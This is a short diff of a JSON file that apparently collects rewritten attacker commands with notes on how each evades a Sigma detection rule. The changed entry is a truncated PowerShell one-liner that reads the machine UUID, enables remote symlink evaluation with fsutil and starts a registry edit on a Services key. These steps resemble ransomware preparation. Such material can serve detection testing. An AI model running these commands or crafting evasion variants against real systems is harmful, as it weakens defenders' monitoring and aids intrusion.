@@ -16,4 +16,6 @@
     "explanation": "The command is modified by using the -Command parameter and removing unnecessary quotes, which avoids direct detection by the Sigma rule."
   },
   {
-    "output": "powershell.exe -Command \"& {cmd /c 'wmic csproduct get UUID'; cmd /c 'fsutil behavior set SymlinkEvaluation R2L:1'; cmd /c 'fsutil behavior set SymlinkEvaluation R2R:1'; reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\
+    "output": "powershell.exe -Command \"& {cmd /c 'wmic csproduct get UUID'; cmd /c 'fsutil behavior set SymlinkEvaluation R2L:1'; cmd /c 'fsutil behavior set SymlinkEvaluation R2R:1'; reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"
+  }
+]
